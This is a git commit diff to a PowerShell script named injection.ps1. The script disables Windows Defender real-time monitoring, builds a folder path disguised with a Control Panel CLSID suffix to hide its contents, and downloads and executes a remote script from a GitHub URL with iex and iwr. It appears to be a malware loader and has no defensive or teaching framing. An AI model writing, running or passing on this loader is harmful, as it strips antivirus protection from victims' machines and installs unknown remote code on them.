35b018acea72fef9949277c324ddb3e8f820df3c
43a1723 <hai1723notgay@gmail.com>
2024-06-14 08:44:05 +0700

    Update injection.ps1

--- injection.ps1
+++ injection.ps1
@@ -1,2 +1,7 @@
 Set-MpPreference -DisableRealtimeMonitoring $true
+
+$rdir = "C:\Users\startup"
+$dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
+$temp = "$dir\temp"
+
 iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/vm.ps1" -useb)
